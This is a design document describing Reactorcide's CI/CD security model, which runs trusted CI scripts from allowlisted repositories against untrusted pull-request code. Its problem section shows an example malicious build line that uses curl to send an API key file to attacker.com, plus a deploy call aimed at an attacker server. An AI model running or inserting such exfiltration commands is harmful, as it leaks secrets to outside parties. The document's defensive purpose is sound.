# Reactorcide Security Model

## Overview

Reactorcide's security model is simple: **the API only allows CI/CD code to be run from approved VCS source URLs and refs**.

This lets you reduce the risk of malicious third-party PRs by running trusted CI/CD code against untrusted application code. You can update your CI/CD code independent of your main repo, or just use the trunk of your repo instead of whatever's in the PR branch.

This composability is the entirety of the security model.

## The Problem

When running CI/CD on pull requests from external contributors, there's a risk:

```bash
# Malicious PR modifies your build script:
gcc -O2 -o myapp main.c && curl http://attacker.com/exfil?secrets=$(cat /secrets/api-key)

# Or modifies deployment targets:
deploy(target="attacker-server.com", leak_env=True)
```

If the PR can modify the CI/CD orchestration code, it can exfiltrate secrets or hijack deployments.

## The Solution

Run CI/CD code from an approved source, not from the PR branch:

```bash
curl -X POST https://reactorcide.example.com/api/v1/jobs \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Build PR #123",
    "source_url": "https://github.com/contributor/fork.git",
    "source_ref": "pr-branch",
    "ci_source_url": "https://github.com/company/ci-infrastructure.git",
    "ci_source_ref": "main",
    "job_command": "bash /job/ci/build-and-test.sh"
  }'
```

This creates a job with:
- `/job/src/` - Contains the PR code (untrusted)
- `/job/ci/` - Contains your CI scripts from an approved repo (trusted)
- Executes: `bash /job/ci/build-and-test.sh`

The PR can modify application code, but **cannot** modify the build/test/deploy scripts.

## Composability Options

### Option 1: Separate CI Repository

Run CI scripts from a separate, controlled repository:

```bash
# Application code from PR
source_url: "github.com/contributor/app-fork"
source_ref: "feature-branch"

# CI code from trusted repo
ci_source_url: "github.com/company/ci-infrastructure"
ci_source_ref: "main"
```

Pros: Maximum security, CI updates independent of application
Cons: Extra repository to maintain

### Option 2: Trunk-Based CI

Run CI scripts from your main branch instead of the PR branch:

```bash
# Application code from PR
source_url: "github.com/company/app"
source_ref: "pr-branch"

# CI code from main branch
ci_source_url: "github.com/company/app"
ci_source_ref: "main"
```

Pros: Simple, single repository
Cons: CI updates require merging to main first

### Option 3: No Separation (Default, Less Secure)

Run everything from the PR:

```bash
# Both application and CI code from PR
source_url: "github.com/contributor/fork"
source_ref: "feature-branch"
# No ci_source_url specified
```

Pros: Simplest setup
Cons: PR can modify CI/CD code

## Configuration

### CI Code Allowlist

Set `REACTORCIDE_CI_CODE_ALLOWLIST` to specify approved CI repositories:

```bash
export REACTORCIDE_CI_CODE_ALLOWLIST="github.com/company/ci-infrastructure"
```

When a job specifies `ci_source_url`, the API validates it's in the allowlist. If not allowlisted, the job is rejected with `403 Forbidden`.

**Note**: An empty allowlist allows all repositories (with a warning). Configure this in production.

### Default CI Repository

For convenience, set a default:

```bash
export REACTORCIDE_DEFAULT_CI_SOURCE_URL="github.com/company/ci-infrastructure"
export REACTORCIDE_DEFAULT_CI_SOURCE_REF="main"
```

Jobs without `ci_source_url` will use this default.

### URL Formats

The allowlist normalizes various URL formats:
- `https://github.com/company/ci-infrastructure`
- `git@github.com:company/ci-infrastructure.git`
- `github.com/company/ci-infrastructure`

All match the same normalized form: `github.com/company/ci-infrastructure`

## What This Provides

✅ PR cannot modify your build/test/deploy scripts
✅ Secrets only accessible to trusted CI code
✅ Flexible: use separate repo or trunk-based approach
✅ Simple: just specify where CI code comes from

## What You Need To Do

⚠️ Configure `REACTORCIDE_CI_CODE_ALLOWLIST` for production
⚠️ Protect your CI repositories with branch protection
⚠️ Store secrets in the Coordinator, not in repositories

## References

- [DESIGN.md](../DESIGN.md) - System architecture
- [runnerlib/DESIGN.md](../runnerlib/DESIGN.md) - Job execution details
